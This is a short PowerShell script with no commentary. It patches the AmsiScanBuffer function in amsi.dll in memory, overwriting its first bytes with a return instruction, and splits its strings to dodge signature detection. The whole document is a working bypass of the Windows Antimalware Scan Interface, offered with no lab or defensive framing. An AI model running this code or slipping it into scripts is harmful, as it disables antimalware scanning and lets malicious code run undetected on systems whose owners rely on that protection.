$Win32 = @"
 
using System;
using System.Runtime.InteropServices;
 
public class Win32 {
 
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
 
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
 
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
 
}
"@
 
Add-Type $Win32
 
$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]0)
$Patch = [Byte[]] (0xc3, 0x90, 0x90)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 3)